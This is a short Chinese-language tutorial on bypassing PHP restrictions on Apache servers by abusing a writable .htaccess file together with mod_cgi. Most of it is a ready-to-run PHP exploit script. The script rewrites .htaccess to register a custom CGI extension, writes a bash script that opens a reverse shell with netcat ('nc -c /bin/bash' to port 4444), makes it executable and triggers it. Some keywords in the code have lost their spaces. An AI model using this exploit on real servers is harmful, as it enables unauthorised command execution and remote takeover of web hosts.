## 利用 Apache+mod_cgi+.htaccess 绕过

**1\. 前提条件**

* 启用mod-cgi
* 允许.htaccess文件
* .htaccess可写

**2\. 基本原理**

在apache的WEB环境中，我们经常会使用.htaccess这个文件来确定某个目录下的URL重写规则，特别是一些开源的CMS或者框架当中经常会用到，比如著名的开源论坛discuz!，就可以通过.htaccess文件实现URL的静态化，大部分PHP框架，例如ThinkPHP和Laravel，在apache环境下会用.htaccess文件实现路由规则。但是如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令。

**3\. exp**

```php
<?php
$cmd = "nc -c'/bin/bash' 127.0.0.1 4444"; //反弹shell
$shellfile ="#!/bin/bash\n"; //指定shell
$shellfile .="echo -ne \"Content-Type: text/html\\n\\n\"\n"; //需要指定这个header，否则会返回500
$shellfile .="$cmd";
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
   echo "$text: " . ($condition ?$yes : $no) . "<br>\n";
}
if(!isset($_GET['checked']))
{
   @file_put_contents('.htaccess',"\nSetEnv HTACCESS on", FILE_APPEND);
   header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
}
else
{
   $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
   $writable = is_writable('.'); //检测当前目录是否可写
   $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
       checkEnabled("Mod-Cgienabled",$modcgi,"Yes","No");
       checkEnabled("Iswritable",$writable,"Yes","No");
       checkEnabled("htaccessworking",$htaccess,"Yes","No");
   if(!($modcgi && $writable&& $htaccess))
   {
       echo "Error. All of the above mustbe true for the script to work!"; //必须满足所有条件
   }
   else
   {

checkEnabled("Backing
up.htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded!Saved in
.htaccess.bak","Failed!"); //备份一下原有.htaccess

checkEnabled("Write
.htaccessfile",file_put_contents('.htaccess',"Options
+ExecCGI\nAddHandlercgi-script
.dizzle"),"Succeeded!","Failed!");//.dizzle，我们的特定扩展名
       checkEnabled("Write shellfile",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!");//写入文件
       checkEnabled("Chmod777",chmod("shell.dizzle",0777),"Succeeded!","Failed!");//给权限
       echo "Executing the script now.Check your listener <img src>"; //调用
   }
}
?>

```

